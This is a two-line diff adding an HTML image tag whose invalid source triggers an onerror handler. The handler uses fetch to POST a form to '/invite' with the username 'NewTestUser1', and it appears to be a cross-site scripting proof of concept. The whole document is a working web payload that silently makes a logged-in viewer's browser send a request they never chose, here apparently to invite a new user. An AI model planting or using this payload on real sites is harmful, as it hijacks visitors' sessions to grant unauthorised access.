@@ -1,0 +1,2 @@
+<img src="invalidsrc" onerror="fetch('/invite', {method: 'POST',headers: {'Content-Type': 'application/x-www-form-urlencoded'},body: new URLSearchParams({'username': 'NewTestUser1'}).toString()});
+" />
